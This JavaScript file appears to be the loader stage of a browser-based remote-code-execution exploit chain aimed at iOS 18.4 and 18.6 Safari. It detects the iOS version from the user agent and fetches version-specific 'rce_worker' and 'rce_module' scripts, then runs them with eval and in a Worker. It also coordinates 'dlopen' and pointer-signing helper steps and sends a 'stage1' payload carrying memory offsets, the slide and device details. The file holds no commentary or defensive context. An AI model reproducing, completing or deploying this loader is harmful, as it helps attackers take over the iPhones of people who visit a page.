var SERVER_LOG = true;
let logStart = new Date().getTime();
let logEntryID = 0;
var offsets = {};
var slide;
var chipset;
var device_model;
try { sessionStorage.setItem('ls_running', '1'); sessionStorage.setItem('localSession', '1'); } catch(e) {}
var basePrefix = location.pathname.startsWith('/lightsaber/') ? '/lightsaber' : '';
var localHost = location.origin + basePrefix;
function print(x, reportError = false, dumphex = false) {
    let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
    console.log(out);
    if (!SERVER_LOG && !reportError) return;
    let obj = {
        id: logEntryID++,
        text: out,
    }
    if (dumphex) {
        obj.hex = 1
        obj.text = x
    }
    let req = Object.entries(obj).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&')
    try {
        const xhr = new XMLHttpRequest();
        xhr.open("GET", localHost + "/log?" + req , false);
        xhr.send(null);
    } catch(e) { console.error("log send failed:", e); }
}
function redirect()
{
    try { sessionStorage.removeItem('ls_running'); } catch(e) {}
    try { window.parent.postMessage({ type: 'lightsaber_done' }, location.origin); } catch (e) {}
}
function getJS(fname,method = 'GET')
{
    try
    {
        url = fname;
        print("getJS: fetching " + url);
        let xhr = new XMLHttpRequest();
        xhr.open("GET", `${url}` , false);
        xhr.send(null);
        print("getJS: got " + xhr.status + " (" + xhr.responseText.length + " bytes)");
        return xhr.responseText;
    }
    catch(e)
    {
        print("getJS ERROR: " + e, true);
    }
}
const signal = new Uint8Array(8);
const dlopen_worker = `(() => {
  self.onmessage = function (e) {
    const {
      type,
      data
    } = e.data;
    switch (type) {
      case 'init':
        const canvas = new OffscreenCanvas(1, 1);
        globalThis[0] = data;
        createImageBitmap(canvas).then(bitmap => {
          globalThis[1] = bitmap;
          self.postMessage(null);
        });
        break;
      case 'dlopen':
        globalThis[1].close();
        break;
    }
  };
})();`;
const dlopen_worker_blob = new Blob([dlopen_worker], { type: 'application/javascript'});
const dlopen_worker_url = URL.createObjectURL(dlopen_worker_blob);
const ios_version = (function() {
    print("UserAgent: " + navigator.userAgent);
    let version = /iPhone OS ([0-9_]+)/g.exec(navigator.userAgent)?.[1];
    if (version) {
        let parsed = version.split('_').map(part => parseInt(part));
        print("Detected iOS version: " + parsed.join('.') + " (raw: " + version + ")");
        return parsed;
    }
    print("WARNING: Could not detect iOS version from UA!");
    return null;
})();
print("Loading worker code...");
let workerCode = "";
if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2') {
    print("Using worker for iOS 18.6.x");
    workerCode = getJS(`rce_worker_18.6.js?${Date.now()}`); // local version
} else {
    print("Using worker for iOS 18.4.x");
    workerCode = getJS(`rce_worker.js?${Date.now()}`); // local version
}
print("Worker code loaded: " + (workerCode ? workerCode.length + " bytes" : "FAILED (null/empty)"));
let workerBlob = new Blob([workerCode],{type:'text/javascript'});
let workerBlobUrl = URL.createObjectURL(workerBlob);
(() => {
    function doRedirect() {
      redirect();
    }
    function main() {
        print("=== main() started ===");
        const randomValues = new Uint32Array(32);
        const begin = Date.now();
        const origin = location.origin;
        print("Origin: " + origin);
        const worker = new Worker(workerBlobUrl);
        print("Worker created");
        const dlopen_workers = [];
        async function prepare_dlopen_workers() {
        for (let i = 1; i <= 2; ++i) {
            const worker = new Worker(dlopen_worker_url);
            dlopen_workers.push(worker);
            await new Promise(r => {
            worker.postMessage({
                type: 'init',
                data: 0x11111111 * i
            });
            worker.onmessage = r;
            });
        }
        }
        const iframe = document.createElement('iframe');
        iframe.srcdoc = '';
        iframe.style.height = 0;
        iframe.style.width = 0;
        document.body.appendChild(iframe);
        async function message_handler(e) {
        const data = e.data;
        print("[MSG] Worker message: " + data.type);
        switch (data.type) {
            case 'redirect':
            {
                print("[MSG] Redirecting...");
                doRedirect();
                break;
            }
            case 'prepare_dlopen_workers':
            {
                print("[MSG] Preparing dlopen workers...");
                await prepare_dlopen_workers();
                print("[MSG] dlopen workers prepared, notifying worker");
                worker.postMessage({
                type: 'dlopen_workers_prepared'
                });
                break;
            }
            case 'trigger_dlopen1':
            {
                print("[MSG] trigger_dlopen1");
                dlopen_workers[0].postMessage({
                type: 'dlopen'
                });
                worker.postMessage({
                type: 'check_dlopen1'
                });
                break;
            }
            case 'trigger_dlopen2':
            {
                print("[MSG] trigger_dlopen2");
                dlopen_workers[1].postMessage({
                type: 'dlopen'
                });
                worker.postMessage({
                type: 'check_dlopen2'
                });
                break;
            }
            case 'sign_pointers':
            {
                print("[MSG] sign_pointers");
                iframe.contentDocument.write('1');
                worker.postMessage({
                type: 'setup_fcall'
                });
                break;
            }
            case 'slow_fcall':
            {
                print("[MSG] slow_fcall");
                iframe.contentDocument.write('1');
                worker.postMessage({
                type: 'slow_fcall_done'
                });
                break;
            }
            case 'token':
            {
                const token = (data.token || "").toString();
                if (token.length > 0) {
                    try { sessionStorage.setItem('lightsaber_token', token); } catch (e) {}
                    try { window.parent.postMessage({ type: 'lightsaber_token', token: token }, location.origin); } catch (e) {}
                }
                break;
            }
            default:
            {
                print("[MSG] Unknown message type: " + data.type);
                break;
            }
        }
        }
        worker.onmessage = message_handler;
        try
        {
        print("Loading RCE module...");
        let rceCode = "";
        if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2') {
                print("Using rce_module_18.6.js");
                rceCode = getJS(`rce_module_18.6.js?${Date.now()}`); // local version
            } else {
                print("Using rce_module.js");
                rceCode = getJS(`rce_module.js?${Date.now()}`); // local version
            }
        print("RCE module loaded: " + (rceCode ? rceCode.length + " bytes" : "FAILED (null/empty)"));
        try
        {
            print("Evaluating RCE module...");
            eval(rceCode);
            print("RCE module eval completed");
        }
        catch(e)
        {
            print("Got exception while running rce: " + e, true);
        }
        let desiredHost = "";
        desiredHost = localHost;
        print("desiredHost = " + desiredHost);
            if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
            {
                print("Sending stage1_rce to worker (iOS 18.6 path)");
                worker.postMessage({
                    type: 'stage1_rce',
                    desiredHost,
                    randomValues,
                    SERVER_LOG
                });
            }
            else
            {
                print("Starting check_attempt (iOS 18.4 path)");
        var attempt = new check_attempt();
        attempt.start().then((result) => {
            if(!result)
            {
               // print("Retrying");
                attempt.start().then((result) => {
                    if(!result)
                       print("");
                    else
                            {
                        worker.postMessage({
                        type: 'stage1',
                        begin,
                        origin,
                        ios_version,
                        offsets,
                        slide,
                        chipset,
                        device_model,
                        desiredHost,
                        SERVER_LOG
                });
                            }
                        });
                    }
                    else
                    {
                        //WebViewComptability(attempt, iframe);
            worker.postMessage({
                type: 'stage1',
                begin,
                origin,
                ios_version,
                offsets,
                slide,
                chipset,
                device_model,
                desiredHost,
                SERVER_LOG
            });
                    }
        });
            }
        }
        catch(e)
        {
            print("Got exception on something: " + e, true);
        }
    }
    main();
  })();
